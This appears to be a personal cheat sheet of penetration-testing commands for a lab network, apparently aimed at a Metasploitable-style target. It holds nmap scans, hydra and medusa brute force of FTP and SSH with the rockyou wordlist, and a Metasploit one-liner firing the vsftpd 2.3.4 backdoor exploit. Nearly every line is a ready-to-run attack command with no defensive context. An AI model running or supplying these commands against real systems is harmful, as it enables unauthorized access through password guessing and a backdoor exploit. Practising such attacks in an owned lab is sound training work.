# Find port
nmap -sn 192.168.10.0/24
nmap -sP
nmap -sV -T4 192.168.10.30


nmap -sV -T4 192.168.10.15

# Attack brute force

  # Brute force FTP
hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://192.168.10.15

  # Brute force ssh
medusa -h 192.168.10.15 -P /usr/share/wordlists/rockyou.txt -u msfadmin -M ssh -F -t 4

    # Out put for the pipeline
medusa -h 192.168.10.15 -P /usr/share/wordlists/rockyou.txt -u msfadmin -M ssh -f -t 4 |grep SUCCESS


# VSFTPD
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.10.15; ls; exit"

echo $? # check status last command

